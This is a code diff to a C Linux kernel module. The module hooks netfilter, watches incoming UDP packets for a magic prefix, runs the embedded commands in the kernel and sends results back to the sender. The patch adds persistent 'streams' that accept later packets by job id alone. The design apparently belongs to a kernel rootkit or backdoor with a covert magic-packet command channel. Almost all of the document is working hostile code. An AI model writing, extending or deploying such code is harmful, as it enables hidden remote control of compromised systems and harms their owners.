@@ -145,8 +145,19 @@ struct MRK_command_work {
     struct work_struct work;
     struct cmd_type *cmd;
     const char *arg;
+    size_t arg_len;
     struct origin origin;
 };
+
+int is_open_stream(short job_id) {
+    struct open_stream *stream;
+    hash_for_each_possible(open_streams, stream, node, job_id) {
+        if (stream->origin.job_id == job_id) {
+            return 1;
+        }
+    }
+    return 0;
+}
 
 static void handle_command(struct work_struct *work) {
     char result[1] = {-1};
@@ -155,7 +166,7 @@ static void handle_command(struct work_struct *work) {
     if (command_work->cmd->func == NULL) {
         hash_for_each_possible(open_streams, stream, node, command_work->origin.job_id) {
             if (stream->origin.job_id == command_work->origin.job_id) {
-                stream->type.recv(stream, command_work->arg, strlen(command_work->arg));
+                stream->type.recv(stream, command_work->arg, command_work->arg_len);
                 goto done;
             }
         }
@@ -163,17 +174,23 @@ static void handle_command(struct work_struct *work) {
         stream->origin = command_work->origin;
         stream->type = command_work->cmd->stream;
         hash_add(open_streams, &stream->node, command_work->origin.job_id);
-        stream->type.open(stream);
+        printk(KERN_INFO "Found (stream) %s cmd packet! will open\n", command_work->cmd->name);
         result[0] = 0;
+        send_response(
+            command_work->origin,
+            result,
+            sizeof(result)
+        );
+        stream->type.open(stream);
     } else {
         result[0] = command_work->cmd->func(command_work->arg);
+        printk(KERN_INFO "Found %s cmd packet! executed with code %s\n", command_work->cmd->name, result);
+        send_response(
+            command_work->origin,
+            result,
+            sizeof(result)
+        );
     }
-    printk(KERN_INFO "Found %s cmd packet! executed with code %s\n", command_work->cmd->name, result);
-    send_response(
-        command_work->origin,
-        result,
-        sizeof(result)
-    );
     
 done:
     // From https://github.com/torvalds/linux/blob/v5.8/kernel/workqueue.c:2173
@@ -245,18 +262,26 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
 
     user_data_len = get_udp_user_data(skb, &user_data);
 
-    if (strncmp(user_data, CMD_MAGIC, CMD_MAGIC_LEN)) return NF_ACCEPT;
-    user_data += CMD_MAGIC_LEN;
-    user_data_len -= CMD_MAGIC_LEN;
+    printk(KERN_INFO "job id - %d\n", get_unaligned((job_id_t *)user_data));
+    if (is_open_stream(get_unaligned((job_id_t *)user_data))) {
+        job_id = get_unaligned((job_id_t *)user_data);
+        user_data += sizeof(job_id_t);
+        user_data_len -= sizeof(job_id_t);
+        cmd = cmds + 5;
+    } else {
+        if (strncmp(user_data, CMD_MAGIC, CMD_MAGIC_LEN)) return NF_ACCEPT;
+        user_data += CMD_MAGIC_LEN;
+        user_data_len -= CMD_MAGIC_LEN;
 
-    job_id = get_unaligned((job_id_t *)user_data);
-    user_data += sizeof(job_id_t);
-    user_data_len -= sizeof(job_id_t);
+        job_id = get_unaligned((job_id_t *)user_data);
+        user_data += sizeof(job_id_t);
+        user_data_len -= sizeof(job_id_t);
 
-    cmd = match_buffer_to_cmd_type(user_data);
-    if (cmd == NULL) return NF_ACCEPT;
-    user_data += strlen(cmd->name);
-    user_data_len -= strlen(cmd->name);
+        cmd = match_buffer_to_cmd_type(user_data);
+        if (cmd == NULL) return NF_ACCEPT;
+        user_data += strlen(cmd->name);
+        user_data_len -= strlen(cmd->name);
+    }
 
     command_work = kmalloc(sizeof(struct MRK_command_work), GFP_KERNEL);
     INIT_WORK(&command_work->work, handle_command);
@@ -265,7 +290,9 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
     arg = kmalloc(user_data_len + 1, GFP_KERNEL);
     memcpy(arg, user_data, user_data_len);
     arg[user_data_len] = '\0';
+    printk(KERN_INFO "arg length - %ld\n", strlen(arg));
     command_work->arg = arg;
+    command_work->arg_len = user_data_len;
     command_work->origin.job_id = job_id;
     command_work->origin.local_addr = iph->daddr;
     command_work->origin.remote_addr = iph->saddr;
